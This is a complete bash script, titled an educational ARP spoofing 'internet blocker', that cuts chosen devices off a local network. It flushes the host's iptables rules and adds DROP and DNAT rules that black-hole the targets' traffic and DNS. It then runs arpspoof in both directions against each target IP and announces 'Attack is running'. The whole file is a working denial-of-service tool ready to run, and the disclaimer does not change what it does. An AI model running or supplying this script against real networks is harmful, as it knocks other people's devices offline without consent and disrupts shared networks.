#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: arpspoof, iptables, and root privileges

echo "Enter Router Gateway IP:"
read -p "> " GATEWAY
echo "Enter Target IP (space-separated for multiple):"
read -p "> " TARGET_IPS
echo "Enter Interface (wlan0):"
read -p "> " INTERFACE

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush Iptables existing rules
iptables -F
iptables -X
iptables -t nat -F

# Remove Iptables rules
cat > /bin/netkiller-stop << EOF
iptables -F
iptables -X
iptables -t nat -F
echo "Wifi clients connections are restored"
EOF
chmod 755 /bin/netkiller-stop

for TARGET in $TARGET_IPS; do
    # Basic blocking rules
    iptables -A FORWARD -s "$TARGET" -j DROP
    iptables -A FORWARD -d "$TARGET" -j DROP
    iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"

    # DNS Blocking Rules
    iptables -A FORWARD -s "$TARGET" -p udp --dport 53 -j DROP
    iptables -A FORWARD -s "$TARGET" -p tcp --dport 53 -j DROP
    iptables -A FORWARD -d "$TARGET" -p udp --sport 53 -j DROP
    iptables -A FORWARD -d "$TARGET" -p tcp --sport 53 -j DROP
    iptables -t nat -A PREROUTING -s "$TARGET" -p udp --dport 53 -j DNAT --to-destination 0.0.0.0
    iptables -t nat -A PREROUTING -s "$TARGET" -p tcp --dport 53 -j DNAT --to-destination 0.0.0.0

    # Drop mDNS/Bonjour (common in WiFi networks)
    iptables -A FORWARD -s "$TARGET" -p udp --dport 5353 -j DROP
    iptables -A FORWARD -d "$TARGET" -p udp --sport 5353 -j DROP

    (
        arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
    ) &
done
echo "Attack is running...!!!"
